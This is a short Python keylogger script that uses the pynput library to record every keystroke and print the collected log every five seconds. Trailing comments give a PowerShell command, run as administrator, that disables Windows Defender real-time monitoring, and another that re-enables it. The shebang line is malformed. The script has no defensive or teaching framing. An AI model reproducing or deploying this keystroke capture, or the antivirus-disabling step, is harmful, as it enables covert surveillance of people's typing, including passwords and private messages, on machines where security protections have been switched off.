#!/usr/bin/sh python

import pynput.keyboard
import threading

log = ""


def process_key_press(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "


def report():
    global log
    print(log)
    log = ""
    timer = threading.Timer(5, report)
    timer.start()


keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)


with keyboard_listener:
    report()
    keyboard_listener.join()


# killall python

# need to install pynput in command
# pip install pynput


# Run powershell as administrator
# To disable Windows Defender:
# Set-MpPreference -DisableRealtimeMonitoring $true

# To enable Window Defender:
# Set-MpPreference -DisableRealtimeMonitoring $false